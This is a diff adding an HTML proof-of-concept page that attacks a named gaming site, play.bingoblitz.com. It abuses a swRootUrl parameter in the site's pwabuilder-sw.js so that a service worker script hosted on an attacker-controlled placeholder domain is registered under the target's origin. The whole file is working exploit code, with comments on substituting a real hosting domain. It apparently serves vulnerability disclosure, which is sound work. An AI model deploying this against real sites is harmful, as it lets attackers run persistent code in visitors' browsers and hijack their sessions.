@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: pwabuilder-sw.js swRootUrl Service Worker Hijack</title>
+</head>
+<body>
+<h1>PoC: play.bingoblitz.com Service Worker Hijack</h1>
+<p>Open DevTools console before clicking. Check Application &gt; Service Workers afterward.</p>
+<button id="go">Register hijacked service worker</button>
+<pre id="log"></pre>
+
+<script>
+const TARGET_SW =
+  "https://play.bingoblitz.com/pwabuilder-sw.js?use=0&swRootUrl=" +
+  encodeURIComponent("https://YOUR-POC-HOST.example/");
+  // ^ swap YOUR-POC-HOST.example for the actual GitHub/Cloudflare Pages
+  //   domain hosting this sw.js — must end such that + "sw.js" resolves
+  //   correctly, i.e. swRootUrl should be the *directory* URL ending in /
+
+const logEl = document.getElementById("log");
+function log(...args) {
+  console.log(...args);
+  logEl.textContent += args.map(String).join(" ") + "\n";
+}
+
+document.getElementById("go").addEventListener("click", async () => {
+  if (!("serviceWorker" in navigator)) {
+    log("Service workers not supported in this browser.");
+    return;
+  }
+  try {
+    const reg = await navigator.serviceWorker.register(TARGET_SW, {
+      scope: "/", // scope is bounded by pwabuilder-sw.js's own location (play.bingoblitz.com origin)
+    });
+    log("Registered:", reg.scope);
+    navigator.serviceWorker.ready.then((r) => {
+      log("Ready, active worker:", r.active && r.active.scriptURL);
+    });
+  } catch (e) {
+    log("Registration failed:", e.message);
+  }
+});
+</script>
+</body>
+</html>
